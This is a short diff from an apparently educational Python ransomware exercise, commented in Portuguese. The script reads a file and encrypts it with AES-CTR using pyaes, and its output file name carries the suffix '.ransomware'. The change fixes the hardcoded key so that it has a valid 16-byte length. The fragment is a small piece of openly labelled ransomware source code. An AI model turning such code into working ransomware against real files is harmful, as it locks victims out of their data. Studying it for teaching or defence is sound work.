@@ -10,8 +10,8 @@ encrypted_file_name = f"{file_name}.ransomware"
 with open(file_name, "rb") as file:
     file_data = file.read()
 
-# Chave de criptografia (certifique-se de usar uma chave segura, como 16, 24 ou 32 bytes)
-key = b'cybersecuritysantander2'  # Exemplo: 16, 24 ou 32 bytes
+# Chave de criptografia (16 bytes para AES-128)
+key = b'cybersecurity123'  # Certifique-se de usar 16, 24 ou 32 bytes
 
 # Criar um objeto AES para criptografia
 aes = pyaes.AESModeOfOperationCTR(key)
